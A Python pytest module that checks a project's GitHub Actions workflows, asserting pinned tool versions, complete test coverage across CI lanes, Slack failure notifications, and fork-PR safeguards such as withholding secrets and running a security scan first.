"""Keep the black-box suite independent of application internals and test doubles."""

import ast
import io
import json
import os
import re
import runpy
import subprocess
import sys
import textwrap
import urllib.error
import urllib.request
from pathlib import Path

import pytest

from tests.integration.utils.harness import clean_environment
from tests.integration.utils.managed import assert_no_managed_config


def _markers(nodes):
    return {
        node.attr
        for root in nodes
        for node in ast.walk(root)
        if isinstance(node, ast.Attribute)
        and isinstance(node.value, ast.Attribute)
        and isinstance(node.value.value, ast.Name)
        and node.value.value.id == "pytest"
        and node.value.attr == "mark"
    }


def test_isolated_sessions_disable_antigravity_updates(tmp_path, monkeypatch):
    monkeypatch.setenv("AGY_CLI_DISABLE_AUTO_UPDATE", "1")

    assert clean_environment(tmp_path)["AGY_CLI_DISABLE_AUTO_UPDATE"] == "true"


def test_integration_ci_pins_a_skills_capable_databricks_cli():
    from ucode.databricks import SKILLS_MCP_MIN_DATABRICKS_CLI_VERSION

    workflow = Path(__file__).parent.parent / ".github/workflows/integration.yml"
    setup_blocks = re.findall(
        r"(?m)^      - uses: databricks/setup-cli@[^\n]+\n((?:        [^\n]*\n)*)",
        workflow.read_text(),
    )
    assert setup_blocks, "Integration CI must install the Databricks CLI explicitly"
    for block in setup_blocks:
        version = re.search(r"(?m)^          version: (\d+)\.(\d+)\.(\d+)\s*$", block)
        assert version, "Every integration setup-cli step must pin an exact CLI version"
        assert tuple(map(int, version.groups())) >= SKILLS_MCP_MIN_DATABRICKS_CLI_VERSION


def test_managed_integration_ci_is_blocking():
    workflow = Path(__file__).parent.parent / ".github/workflows/integration.yml"
    managed, gate = workflow.read_text().split("\n  managed:\n", 1)[1].split("\n  cujs:\n", 1)
    assert "continue-on-error:" not in managed
    needs = re.search(r"(?m)^    needs: \[([^\]]+)\]$", gate)
    assert needs is not None
    assert "managed" in {job.strip() for job in needs.group(1).split(",")}
    assert (
        "if: ${{ always() && (github.event_name != 'pull_request' || "
        "github.event.pull_request.head.repo.full_name == github.repository) }}"
    ) in gate
    baseline = _collect_integration_cases(_ci_marker_expression(managed, "codex"))
    routing = _collect_integration_cases(
        _ci_marker_expression(managed, "codex", smart_routing=True)
    )
    assert not baseline & routing
    assert baseline | routing == _collect_integration_cases(
        "(managed_fixture or workspace_switch) and codex and not soft_fail"
    )
    fallback = (
        "test_ug_configure_managed_models.py::test_ug_configure_managed_codex_catalog_fallback"
    )
    assert f"{fallback}[routing-off]" in baseline
    assert f"{fallback}[routing-on]" in routing
    assert (
        "test_ug_configure_managed_models.py::test_managed_fixture_codex_smart_routing_banner"
        in routing
    )


WORKFLOW = Path(__file__).parent.parent / ".github/workflows/integration.yml"
# The quarantined Claude Smart Router toggle journey, split into one test per toggle state.
CLAUDE_TOGGLE_TESTS = (
    "test_smart_router_routes_claude_subagent_at_launch",
    "test_smart_router_skill_turns_claude_subagent_routing_off",
    "test_smart_router_skill_turns_claude_subagent_routing_back_on",
)


def _workflow_job(name, next_name):
    workflow = WORKFLOW.read_text()
    return workflow.split(f"\n  {name}:\n", 1)[1].split(f"\n  {next_name}:\n", 1)[0]


def _ci_marker_expression(job, agent, *, smart_routing=False):
    marker = re.search(r"(?m)^      TEST_MARKER: (.+)$", job) or re.search(r'-- -m "([^"]+)"', job)
    assert marker is not None
    return (
        marker.group(1)
        .replace("${{ matrix.agent }}", agent)
        .replace("$AGENT", agent)
        .replace(
            "${{ matrix.smart_routing && 'codex_smart_routing' || 'not codex_smart_routing' }}",
            "codex_smart_routing" if smart_routing else "not codex_smart_routing",
        )
    )


def test_codex_desktop_macos_ci_is_blocking_and_installs_a_pinned_app():
    jobs = _integration_jobs()
    job = jobs["codex-desktop-macos"]
    needs = re.search(r"(?m)^    needs: \[([^\]]+)\]$", jobs["cujs"])
    assert needs is not None
    assert "codex-desktop-macos" in {name.strip() for name in needs.group(1).split(",")}
    assert "runs-on: macos-latest" in job
    assert "continue-on-error:" not in job
    assert re.search(r"(?m)^      CHATGPT_APP_SHA256: [0-9a-f]{64}$", job)
    assert "codex-app-prod/ChatGPT-darwin-arm64-${CHATGPT_APP_VERSION}.zip" in job
    assert "shasum -a 256 -c" in job
    assert "--macos-desktop" in job
    assert _collect_integration_cases(_ci_marker_expression(job, "codex")) == {
        "test_ug_codex_desktop_macos.py::test_ug_codex_desktop_macos_completes_a_gateway_turn"
    }


def test_latest_harness_runs_the_newest_signed_chatgpt_app():
    workflow = _workflow("harness-latest.yml")
    entry = re.search(
        r"(?m)^          - suite: desktop\n            runner: (.+)\n            managed: true\n"
        r"            marker: (.+)$",
        workflow,
    )
    assert entry is not None
    assert entry.group(1) == "macos-latest"
    assert "codex-app-prod/appcast.xml" in workflow
    # No hash exists for an unseen build, so Apple's signature checks stand in for it.
    assert "codesign --verify --deep --strict /Applications/ChatGPT.app" in workflow
    assert "spctl --assess --type execute /Applications/ChatGPT.app" in workflow
    assert re.search(r"(?m)^          OPENAI_TEAM_ID: [A-Z0-9]{10}$", workflow)
    assert '"TeamIdentifier=$OPENAI_TEAM_ID"' in workflow
    assert "${{ matrix.suite == 'desktop' && '--macos-desktop' || '' }}" in workflow
    assert _collect_integration_cases(entry.group(2)) == {
        "test_ug_codex_desktop_macos.py::test_ug_codex_desktop_macos_completes_a_gateway_turn"
    }


def test_soft_fail_ci_is_non_blocking_on_both_platforms():
    jobs = _integration_jobs()
    job = jobs["soft-fail"]
    assert "continue-on-error: true" in job
    assert "os: [ubuntu-22.04, windows-latest]" in job
    assert "runs-on: ${{ matrix.os }}" in job
    assert "needs: [workspace, full, managed]" in job
    assert "!cancelled() && needs.workspace.result == 'success'" in job
    assert "fail-fast: false" in job
    assert "max-parallel: 1" in job
    assert "agent: [claude]" in job
    assert "AGENT: ${{ matrix.agent }}" in job
    assert "ARTIFACT_NAME: integration-soft-fail-${{ matrix.agent }}-${{ matrix.os }}" in job
    assert "steps: *live-steps" in job
    needs = re.search(r"(?m)^    needs: \[([^\]]+)\]$", jobs["cujs"])
    assert needs is not None
    assert "soft-fail" not in {name.strip() for name in needs.group(1).split(",")}
    for name in ("smoke", "full", "managed"):
        assert "continue-on-error:" not in jobs[name]
        assert "and not soft_fail" in jobs[name]


def test_soft_fail_marks_only_the_affected_claude_journey():
    marked = []
    for path in (Path(__file__).parent / "integration").glob("test_*.py"):
        for node in ast.parse(path.read_text()).body:
            if isinstance(node, ast.FunctionDef) and "soft_fail" in _markers(node.decorator_list):
                marked.append((path.name, node.name))
    assert marked == [("test_ug_smart_routing_hooks.py", name) for name in CLAUDE_TOGGLE_TESTS]


def _collect_integration_cases(expression):
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "pytest",
            "--confcutdir=tests/integration",
            "tests/integration",
            "--collect-only",
            "-q",
            "-m",
            expression,
        ],
        cwd=WORKFLOW.parent.parent.parent,
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    cases = {line for line in result.stdout.splitlines() if line.startswith("test_")}
    assert cases, result.stdout
    return cases


@pytest.mark.parametrize("agent", ["claude", "codex"])
def test_live_ci_lanes_together_cover_every_blocking_live_case(agent):
    if agent == "codex":
        workflow = WORKFLOW.read_text()
        assert re.search(r"codex_version:\n\s+description: [^\n]+\n\s+default: 0\.154\.0", workflow)
        assert "  CODEX_VERSION: ${{ inputs.codex_version || '0.154.0' }}" in workflow
    jobs = _integration_jobs()
    selected = []
    for name in ("smoke", "full"):
        selected.append(_collect_integration_cases(_ci_marker_expression(jobs[name], agent)))
    smoke, full = selected
    if agent == "codex":
        routing = _collect_integration_cases(
            _ci_marker_expression(jobs["full"], agent, smart_routing=True)
        )
        assert not (smoke | full) & routing
        assert (
            "test_ug_codex_v2_routing.py::test_ug_codex_native_v2_plain_assignment_routing"
            in routing
        )
        assert any("::test_smart_routing_codex_route_subagent_hook[" in case for case in full)
        for name in ("full", "managed"):
            assert "smart_routing: [false]" in jobs[name]
            assert (
                "CODEX_VERSION: ${{ matrix.smart_routing && '0.165.0' || "
                "inputs.codex_version || '0.154.0' }}"
            ) in jobs[name]
            assert "matrix.smart_routing && '-smart-routing' || ''" in jobs[name]
        for platform in ("ubuntu-22.04", "windows-latest"):
            assert (
                f"- os: {platform}\n            agent: codex\n            smart_routing: true"
                in jobs["full"]
            )
        assert "- agent: codex\n            smart_routing: true" in jobs["managed"]
        full |= routing
    # Full skips smoke cases only because smoke runs them on the same OS matrix.
    assert "os: [ubuntu-22.04, windows-latest]" in jobs["smoke"]
    assert "os: [ubuntu-22.04, windows-latest]" in jobs["full"]
    assert not smoke & full
    selected = smoke | full
    if agent == "claude":
        staging = _collect_integration_cases(
            f"({_ci_marker_expression(jobs['anthropic-mps'], agent)}) and live"
        )
        assert not selected & staging
        selected |= staging
    assert selected == _collect_integration_cases(f"live and {agent} and not soft_fail")


def test_anthropic_mps_ci_uses_staging_service_principal_and_preserves_coverage(monkeypatch):
    monkeypatch.setenv("UG_INTEGRATION_AGENTS", "claude,codex,copilot")
    jobs = _integration_jobs()
    job = jobs["anthropic-mps"]
    assert not re.search(r"(?m)^    needs:", job)
    assert "UCODE_TEST_WORKSPACE: https://dbc-1bb9e8f5-bf3a.staging.cloud.databricks.com" in job
    assert "DATABRICKS_CLIENT_ID: 39206fba-a07b-4954-b8f9-4a1c9c069bba" in job
    assert "DATABRICKS_CLIENT_SECRET: ${{ secrets.UG_ANTHROPIC_MPS_CLIENT_SECRET }}" in job
    assert "DATABRICKS_BEARER:" not in job
    assert "os: [ubuntu-22.04, windows-latest]" in job
    assert "agent: [claude, copilot]" in job
    assert "fail-fast: false" in job
    assert "group: databricks-protected-runner-group" in job
    assert (
        "labels: ${{ matrix.os == 'windows-latest' && 'windows-server-latest' "
        "|| 'linux-ubuntu-latest' }}"
    ) in job
    assert "PACKAGE_INDEX: https://pypi-proxy.cloud.databricks.com/simple" in job
    assert "NPM_REGISTRY: https://npm-proxy.cloud.databricks.com" in job
    assert "steps: *live-steps" in job
    assert "continue-on-error: ${{ matrix.agent == 'copilot' }}" in job
    assert "timeout-minutes: ${{ matrix.agent == 'copilot' && 30 || 40 }}" in job
    assert "AGENT: ${{ matrix.agent }}" in job
    assert "ARTIFACT_NAME: integration-anthropic-mps-${{ matrix.agent }}-${{ matrix.os }}" in job
    selected = set()
    for agent in ("claude", "copilot"):
        cases = _collect_integration_cases(_ci_marker_expression(job, agent))
        assert not selected & cases
        selected |= cases
    assert selected == _collect_integration_cases("anthropic_mps")
    assert '--npm-registry "$NPM_REGISTRY"' in jobs["smoke"]
    for job_name, agent in (("full", "claude"), ("managed", "claude"), ("copilot", "copilot")):
        assert not selected & _collect_integration_cases(
            _ci_marker_expression(jobs[job_name], agent)
        )
    needs = re.search(r"(?m)^    needs: \[([^\]]+)\]$", jobs["cujs"])
    assert needs is not None
    required = {name.strip() for name in needs.group(1).split(",")}
    assert "anthropic-mps" in required


def test_anthropic_mps_fixtures_use_the_same_service():
    from scripts.run_integration import arguments
    from tests.integration.utils.constants import MANAGED_CLAUDE_PROVIDER_SERVICE

    expected = "main.ucode.dont_delete_ci_company_anthropic_mps"
    args = arguments(["--claude-version", "2.1.290", "--installation-only"], environment={})
    assert args.claude_provider == MANAGED_CLAUDE_PROVIDER_SERVICE == expected
    for name in ("claude_mps", "claude_mps_defaults"):
        config = json.loads(
            (Path(__file__).parent / "fixtures" / "managed_config" / f"{name}.json").read_text()
        )
        assert config["enabled_agents"][0]["config"]["models"]["model_provider_service"] == expected


def test_smoke_and_full_journeys_run_every_agent_and_os_in_parallel():
    jobs = _integration_jobs()
    assert "concurrency:" not in jobs["smoke"]
    assert "concurrency:" not in jobs["full"]
    assert "max-parallel: 4" in jobs["full"]


def test_full_claude_lane_includes_both_desktop_journeys():
    full = _integration_jobs()["full"]
    cases = _collect_integration_cases(_ci_marker_expression(full, "claude"))
    assert {
        "test_ug_configure_claude_desktop.py::test_ug_configure_claude_desktop_profile_lifecycle",
        "test_ug_configure_claude_desktop.py::test_ug_configure_claude_desktop_subscription_relay",
    } <= cases
    assert "os: [ubuntu-22.04, windows-latest]" in full
    assert "CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}" in full


@pytest.mark.parametrize(
    ("job_name", "agent", "smart_routing", "retained_test"),
    [
        ("smoke", "claude", False, "test_ug_claude_headless_prompt_argument"),
        ("smoke", "codex", False, "test_ug_codex_headless_prompt_argument"),
        ("full", "claude", False, "test_smart_routing_claude_route_subagent_hook"),
        ("full", "codex", False, "test_smart_routing_codex_route_subagent_hook"),
        ("full", "codex", True, "test_smart_router_skill_turns_codex_subagent_routing_back_on"),
        ("managed", "claude", False, "test_ug_configure_managed_claude"),
        ("managed", "codex", False, "test_ug_configure_managed_codex"),
        ("managed", "codex", True, "test_smart_router_skill_turns_codex_subagent_routing_back_on"),
        ("soft-fail", "claude", False, None),
    ],
)
def test_soft_fail_ci_selectors_preserve_coverage(job_name, agent, smart_routing, retained_test):
    job = _integration_jobs()[job_name]
    cases = _collect_integration_cases(
        _ci_marker_expression(job, agent, smart_routing=smart_routing)
    )
    if retained_test is not None:
        assert any(f"::{retained_test}" in case for case in cases), cases
        assert not any(f"::{toggle}[" in case for case in cases for toggle in CLAUDE_TOGGLE_TESTS)
        return
    assert cases == {
        f"test_ug_smart_routing_hooks.py::{toggle}[{variant}]"
        for toggle in CLAUDE_TOGGLE_TESTS
        for variant in (
            "routing-only",
            "orchestration",
            "managed-default",
            "subagent_only_v0",
            "subagent_only_v1",
            "subagent_orch_v0",
        )
    } | {
        "test_ug_smart_routing_hooks.py::test_smart_router_routes_claude_subagent_at_launch"
        "[subagent_only_v0-glm]"
    }


def _discover_cujs(root, output):
    plan = _workflow_job("dedicated-cuj-plan", "dedicated-cuj")
    script = textwrap.dedent(plan.split("        run: |\n", 1)[1])
    result = subprocess.run(
        ["bash", "-c", script],
        cwd=root,
        env={"PATH": os.environ["PATH"], "GITHUB_OUTPUT": str(output)},
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode:
        return None, result.stderr
    return json.loads(output.read_text().removeprefix("cujs=")), result.stderr


def test_dedicated_cuj_ci_runs_each_discovered_file_on_its_own_runner():
    job = _workflow_job("dedicated-cuj", "cujs")

    assert "docs.google.com/document/d/1WKd1fdWD0Y4tAV1H9Si-SGx2UZFL7iZ2S3HtBjidmS0" in job
    assert "name: E2E CUJs · ${{ matrix.name }}" in job
    assert "fail-fast: false" in job
    assert "include: ${{ fromJSON(needs.dedicated-cuj-plan.outputs.cujs) }}" in job
    assert 'pytest --confcutdir=tests/e2e_cuj "tests/e2e_cuj/${{ matrix.test }}"' in job
    assert 'UV_HTTP_TIMEOUT: "120"' in job and 'UV_HTTP_RETRIES: "6"' in job
    assert "UG_CUJ1_WORKSPACE: ${{ secrets.UG_CUJ1_WORKSPACE }}" in job
    assert (
        "CODEX_VERSION: ${{ matrix.test == 'test_cuj4_smart_routing.py' && '0.165.0' || "
        "inputs.codex_version || '0.154.0' }}"
    ) in job


def test_latest_harness_is_scheduled_and_opt_in():
    workflow = _workflow("harness-latest.yml")
    trigger = workflow.split("\non:\n", 1)[1].split("\npermissions:\n", 1)[0]
    assert "cron: '0 22 * * 1-5'" in trigger
    assert "workflow_dispatch:" in trigger
    assert "pull_request" not in trigger and "push:" not in trigger
    assert "harness-latest" not in _integration_jobs()

    for package in ("@anthropic-ai/claude-code", "@openai/codex"):
        assert f"npm view {package}@latest version" in workflow
    assert "-m harness_latest" in workflow
    assert "harness_latest and managed_fixture" in workflow
    assert "harness_latest and not managed_fixture" in workflow
    assert '-m "$TEST_MARKER"' in workflow
    assert "-k " not in workflow
    assert "continue-on-error:" not in workflow


SLACK_NOTIFY = Path(__file__).parent.parent / ".github/scripts/slack-notify/notify.py"


def _assert_slack_notify_wiring(notify):
    assert "actions: read" in notify and "contents: read" in notify
    assert "sparse-checkout: .github/scripts/slack-notify/notify.py" in notify
    assert "secrets.SLACK_WEBHOOK_UG_CODING_AGENTS_POD" in notify
    assert "run: python3 .github/scripts/slack-notify/notify.py" in notify


def test_terminal_bench_runs_twice_daily_and_notifies_slack():
    workflow = _workflow("terminal-bench.yml")
    assert "cron: '0 7,19 * * *'" in workflow
    notify = workflow.split("\n  notify:\n", 1)[1]
    assert "needs: [harbor, native]" in notify
    assert "if: ${{ !cancelled() }}" in notify
    assert "NOTIFY_NAME: Terminal Bench" in notify
    assert (
        "NOTIFY_RESULT: ${{ contains(needs.*.result, 'failure') && 'failure' || 'success' }}"
        in notify
    )
    _assert_slack_notify_wiring(notify)


@pytest.mark.parametrize(
    ("result", "claude_version", "job_conclusion", "api_error", "slack_error"),
    [
        ("success", "2.1.290", "success", False, False),
        ("failure", "2.1.290", "failure", False, False),
        ("failure", "2.1.290", "timed_out", False, False),
        ("skipped", "", "failure", False, False),
        ("failure", "2.1.290", "failure", True, False),
        ("success", "2.1.290", "success", False, True),
    ],
)
def test_latest_harness_slack_notification(
    monkeypatch, capsys, result, claude_version, job_conclusion, api_error, slack_error
):
    workflow = _workflow("harness-latest.yml")
    resolver, harness = workflow.split("\n  harness-latest:\n", 1)
    harness, notify = harness.split("\n  notify:\n", 1)
    assert "outputs:" in resolver
    assert "needs: resolve-versions" in harness
    for agent in ("claude", "codex"):
        assert f"needs.resolve-versions.outputs.{agent}" in harness
    assert "needs: [resolve-versions, harness-latest]" in notify
    assert "always()" in notify
    assert "needs.harness-latest.result == 'success'" in notify
    assert "needs.harness-latest.result == 'failure'" in notify
    assert "needs.resolve-versions.result == 'failure'" in notify
    assert "NOTIFY_NAME: Latest harness test" in notify
    assert "NOTIFY_RESULT: ${{ needs.harness-latest.result }}" in notify
    _assert_slack_notify_wiring(notify)

    env = {
        "NOTIFY_NAME": "Latest harness test",
        "NOTIFY_RESULT": result,
        "CLAUDE_VERSION": claude_version,
        "CODEX_VERSION": "0.154.0",
        "GITHUB_REPOSITORY": "databricks/unity-gateway",
        "GITHUB_RUN_ID": "123",
        "GITHUB_API_URL": "https://api.github.com",
        "GITHUB_SERVER_URL": "https://github.com",
        "GH_TOKEN": "test-token",
        "SLACK_WEBHOOK": "https://example.invalid/slack",
    }
    for key, value in env.items():
        monkeypatch.setenv(key, value)
    job_url = "https://github.com/databricks/unity-gateway/actions/runs/123/job/456"
    posted = []

    def urlopen(request, timeout):
        assert timeout == 30
        if request.full_url == env["SLACK_WEBHOOK"]:
            assert request.method == "POST"
            assert request.get_header("Content-type") == "application/json"
            if slack_error:
                raise urllib.error.URLError("Slack unavailable")
            posted.append(json.loads(request.data))
            return io.BytesIO(b"ok")
        assert request.full_url == (
            "https://api.github.com/repos/databricks/unity-gateway/actions/runs/123/jobs"
            "?filter=latest&per_page=100"
        )
        assert request.get_header("Authorization") == "Bearer test-token"
        if api_error:
            raise urllib.error.URLError("GitHub unavailable")
        jobs = [
            {"conclusion": "success", "html_url": "other-job"},
            {"conclusion": job_conclusion, "html_url": job_url},
        ]
        return io.BytesIO(json.dumps({"jobs": jobs}).encode())

    monkeypatch.setattr(urllib.request, "urlopen", urlopen)
    if slack_error:
        with pytest.raises(urllib.error.URLError, match="Slack unavailable"):
            runpy.run_path(str(SLACK_NOTIFY), run_name="__main__")
        assert not posted
        return
    runpy.run_path(str(SLACK_NOTIFY), run_name="__main__")
    versions = f"Versions used: Claude Code {claude_version or 'unknown'}, Codex: 0.154.0"
    run_url = f"{env['GITHUB_SERVER_URL']}/{env['GITHUB_REPOSITORY']}/actions/runs/123"
    if result == "success":
        expected = f"✅ Latest harness test succeeded. {versions}. Link to run {run_url}"
    else:
        link = job_url if not api_error else run_url
        expected = (
            f"❌ ALERT! Latest harness test failed. {versions}. Link to failed job: {link} "
            "<@U09DPGC3DFY> <@U09EFHFRT24>"
        )
    assert posted == [{"text": expected}]
    assert expected in capsys.readouterr().out


@pytest.mark.skipif(sys.platform == "win32", reason="dedicated-cuj-plan runs on Linux")
def test_every_cuj_file_is_discovered_with_a_unique_check_name(tmp_path):
    root = Path(__file__).parent.parent
    entries, stderr = _discover_cujs(root, tmp_path / "github-output")

    assert entries is not None, stderr
    assert [entry["test"] for entry in entries] == sorted(
        path.name for path in (root / "tests/e2e_cuj").glob("test_*.py")
    )
    names = [entry["name"] for entry in entries]
    assert len(set(names)) == len(names), f"Duplicate CUJ_NAME values: {names}"
    for entry in entries:
        number = re.fullmatch(r"test_cuj(\d+)_[a-z0-9_]+\.py", entry["test"])
        assert number, f"Name CUJ files test_cuj<N>_<topic>.py: {entry['test']}"
        assert entry["name"].startswith(f"CUJ {number.group(1)} · "), entry


@pytest.mark.skipif(sys.platform == "win32", reason="dedicated-cuj-plan runs on Linux")
def test_cuj_discovery_fails_for_a_file_without_a_check_name(tmp_path):
    cujs = tmp_path / "tests/e2e_cuj"
    cujs.mkdir(parents=True)
    (cujs / "test_cuj1_a.py").write_text('import os\n\nCUJ_NAME = "CUJ 1 · A"\n')
    (cujs / "test_cuj2_b.py").write_text("import os\n")

    entries, stderr = _discover_cujs(tmp_path, tmp_path / "github-output")

    assert entries is None
    assert "test_cuj2_b.py must define CUJ_NAME" in stderr


FORK_GUARD = (
    "github.event_name != 'pull_request' || "
    "github.event.pull_request.head.repo.full_name == github.repository"
)
# Fork PRs get no secrets or OIDC token, so jobs that need either must skip them.
SKIPPED_ON_FORK_PRS = {
    "anthropic-mps",
    "cowork-inference-windows",
    "cowork-inference-macos",
    "workspace",
    "smoke",
    "headless-windows",
    "full",
    "soft-fail",
    "opencode",
    "copilot",
    "antigravity",
    "managed",
    "managed-opencode",
    "codex-desktop-macos",
    "dedicated-cuj-plan",
    "dedicated-cuj",
    "cujs",
}


def _integration_jobs():
    workflow = (Path(__file__).parent.parent / ".github/workflows/integration.yml").read_text()
    body = workflow.split("\njobs:\n", 1)[1]
    return dict(re.findall(r"(?ms)^  ([a-z0-9-]+):\n(.*?)(?=^  [a-z0-9-]+:\n|\Z)", body))


def _skips_fork_prs(jobs, name):
    job = jobs[name]
    condition = re.search(r"(?m)^    if: (.*)$", job)
    if condition and FORK_GUARD in condition.group(1):
        return True
    needs = re.search(r"(?m)^    needs: \[?([a-z0-9-, ]+)\]?$", job)
    for need in [need.strip() for need in needs.group(1).split(",")] if needs else []:
        requires_success = (
            condition is None or f"needs.{need}.result == 'success'" in condition.group(1)
        )
        if requires_success and _skips_fork_prs(jobs, need):
            return True
    return False


def test_integration_jobs_that_run_on_fork_pull_requests_need_no_credentials():
    jobs = _integration_jobs()
    skipped = {name for name in jobs if _skips_fork_prs(jobs, name)}

    assert skipped == SKIPPED_ON_FORK_PRS
    for name in set(jobs) - skipped:
        assert "secrets." not in jobs[name] and "id-token: write" not in jobs[name], (
            f"{name} runs on fork PRs, which get no secrets or OIDC token"
        )


MEMBER_ONLY = 'contains(fromJSON(\'["MEMBER", "OWNER"]\'), github.event.comment.author_association)'


def _workflow(name):
    return (Path(__file__).parent.parent / ".github/workflows" / name).read_text()


def test_fork_integration_runs_only_authorized_pr_heads():
    workflow = _workflow("fork-integration.yml")
    authorize = workflow.split("\n  authorize:\n", 1)[1].split("\n  reject:\n", 1)[0]
    reject = workflow.split("\n  reject:\n", 1)[1].split("\n  integration:\n", 1)[0]
    integration = workflow.split("\n  integration:\n", 1)[1].split("\n  report:\n", 1)[0]
    gate = workflow.split("\n  security-gate:\n", 1)[1].split("\n  integration:\n", 1)[0]
    report = workflow.split("\n  report:\n", 1)[1]

    assert re.search(r"(?m)^on:\n  issue_comment:\n    types: \[created\]\n", workflow)
    assert "pull_request_target" not in workflow
    assert "actions/checkout" not in workflow, "Only integration.yml checks out the pinned commit"
    command = "startsWith(github.event.comment.body, '/integration-test ')"
    assert command in authorize and command in reject
    assert MEMBER_ONLY in authorize
    assert f"!({MEMBER_ONLY} ||" in reject
    assert "Prior contributors can run integration tests on their own PR" in reject
    assert "set -euo pipefail" in authorize
    assert '[[ "$sha" =~ ^[0-9a-f]{40}$ ]]' in authorize
    assert "state=pending" in authorize
    assert "needs: authorize" in gate
    assert "uses: ./.github/workflows/security-gate.yml" in gate
    assert "pr-number: ${{ github.event.issue.number }}" in gate
    assert "head-sha: ${{ needs.authorize.outputs.sha }}" in gate
    assert "actions: read" in gate and "secrets:" not in gate
    assert "needs: [authorize, security-gate]" in integration
    assert "if:" not in integration, "Both prerequisites must succeed before secrets are supplied"
    assert "group: fork-integration-${{ github.event.issue.number }}" in integration
    assert "uses: ./.github/workflows/integration.yml" in integration
    assert "ref: ${{ needs.authorize.outputs.sha }}" in integration
    assert "needs.authorize.result == 'success'" in report
    assert "needs: [authorize, security-gate, integration]" in report
    assert "SCAN_RESULT: ${{ needs.security-gate.result }}" in report
    assert "repos/$GITHUB_REPOSITORY/statuses/$SHA" in report
    assert "concurrency:" not in workflow.split("\njobs:\n", 1)[0], (
        "Workflow-level concurrency would let any PR comment cancel a run"
    )


HEAD = "0123456789abcdef0123456789abcdef01234567"
# Verified against the live API on the protected runner; a text change here must be re-verified.
PR_HEAD_JQ = '[.head.sha, (.head.repo.full_name // "")] | @tsv'


@pytest.mark.skipif(sys.platform == "win32", reason="the authorize step runs bash on Linux")
@pytest.mark.parametrize(
    ("comment", "head_repo", "accepted", "reason"),
    [
        ("/integration-test", "fork/unity-gateway", True, ""),
        (f"/integration-test {HEAD[:7]}", "fork/unity-gateway", True, ""),
        (f"/integration-test {HEAD}", "fork/unity-gateway", True, ""),
        ("/integration-test", "databricks/unity-gateway", True, ""),
        ("/integration-test 1234567", "fork/unity-gateway", False, "the PR head is now 0123456"),
        ("/integration-test please", "fork/unity-gateway", False, "use `/integration-test`"),
        ("/integration-test", None, False, "fork repository no longer exists"),
    ],
)
def test_fork_integration_authorize_pins_the_pr_head_or_the_reviewed_commit(
    tmp_path, comment, head_repo, accepted, reason
):
    workflow = _workflow("fork-integration.yml")
    authorize = workflow.split("\n  authorize:\n", 1)[1].split("\n  reject:\n", 1)[0]
    script = textwrap.dedent(authorize.split("        run: |\n", 1)[1])
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    # What real gh prints for that query; any other --jq expression gets no output and is refused.
    (tmp_path / "pr.tsv").write_text(f"{HEAD}\t{head_repo or ''}\n")
    fake_gh = bin_dir / "gh"
    fake_gh.write_text(
        "#!/bin/sh\n"
        f'echo "$*" >> "{tmp_path}/calls"\n'
        f"case \"$*\" in 'api repos/databricks/unity-gateway/pulls/7 --jq {PR_HEAD_JQ}')"
        f' cat "{tmp_path}/pr.tsv";; esac\n'
    )
    fake_gh.chmod(0o755)
    output = tmp_path / "github-output"
    result = subprocess.run(
        ["bash", "-c", script],
        env={
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "GITHUB_REPOSITORY": "databricks/unity-gateway",
            "GITHUB_OUTPUT": str(output),
            "PR_NUMBER": "7",
            "COMMENT_ID": "99",
            "COMMENT_BODY": comment,
            "RUN_URL": "https://example/run",
        },
        capture_output=True,
        text=True,
        timeout=10,
    )
    calls = (tmp_path / "calls").read_text()

    if accepted:
        assert result.returncode == 0, result.stdout + result.stderr
        assert output.read_text() == f"sha={HEAD}\n"
        assert f"statuses/{HEAD} -f state=pending" in calls
    else:
        assert result.returncode != 0
        assert not output.exists()
        assert reason in calls and "statuses/" not in calls


def test_fork_integration_github_api_jobs_run_on_allowlisted_runners():
    # The org IP allow list rejects GitHub API calls from GitHub-hosted runners.
    workflow = _workflow("fork-integration.yml")
    protected = "    runs-on:\n      group: databricks-protected-runner-group\n      labels: linux-ubuntu-latest\n"

    assert workflow.count(protected) == 3
    assert "runs-on: ubuntu-latest" not in workflow
    assert not re.search(r"(?m)^\s*[^#\n]*\bjq\s+-", workflow)


def test_no_workflow_uses_pull_request_target():
    # GitHub disables pull_request_target by default in public repos from 2026-11-02.
    workflows = sorted((Path(__file__).parent.parent / ".github/workflows").glob("*.yml"))

    assert workflows
    assert [path.name for path in workflows if "pull_request_target" in path.read_text()] == []


def test_security_scan_runs_before_every_job_that_runs_pr_code():
    # A finding skips every test job, which fails the required test and e2e checks.
    gate_job = (
        "  security-gate:\n    name: Security Gate\n    permissions:\n"
        "      actions: read\n    uses: ./.github/workflows/security-gate.yml\n"
    )
    ci = _workflow("ci.yml")
    publish = _workflow("publish-skills-test.yml")
    scan = _workflow("security-scan.yml")
    gate = _workflow("security-gate.yml")

    assert gate_job in ci and "\n  lint:\n    name: Lint\n" in ci
    assert (
        ci.split("\n  lint:\n", 1)[1].split("\n  test:\n", 1)[0].count("needs: security-gate") == 1
    )
    assert gate_job in publish and publish.count("    needs: security-gate\n") == 2
    assert "workflow_run:\n    workflows: [CI]\n    types: [requested]" in scan
    assert "workflow_call:" not in scan
    assert "group: security-scan-${{ github.event.workflow_run.id }}" in scan
    assert "run-name: 'Security Scan for CI run ${{ github.event.workflow_run.id }}'" in scan
    assert "run-name: 'CI #${{ github.event.pull_request.number || github.run_id }}'" in ci
    assert 'origin "$POLICY_SHA"' in scan and "${{ github.workflow_sha }}" in scan
    assert "bootstrap" not in scan
    assert re.search(r"(?m)^on:\n  workflow_call:\n    inputs:\n", gate)
    assert "github.event_name == 'pull_request' || github.event_name == 'issue_comment'" in gate
    assert "PR_NUMBER: ${{ inputs.pr-number || github.event.pull_request.number }}" in gate
    assert "HEAD_SHA: ${{ inputs.head-sha || github.event.pull_request.head.sha }}" in gate
    assert "PR_UPDATED_AT: ${{ github.event.pull_request.updated_at }}" in gate
    assert "actions: read" in gate and "uses:" not in gate
    assert "${{ secrets." not in scan + gate
    # The PR's .gitattributes must not hide changes from the diff-based scans.
    assert 'git -C pr diff --no-renames --text --no-textconv "$BASE_SHA...HEAD" > pr.diff' in scan
    # Unquoted path lists, and no `# nosemgrep` waivers from the PR itself.
    assert 'git -C pr diff --no-renames --name-only -z "$BASE_SHA...HEAD" > changed.txt' in scan
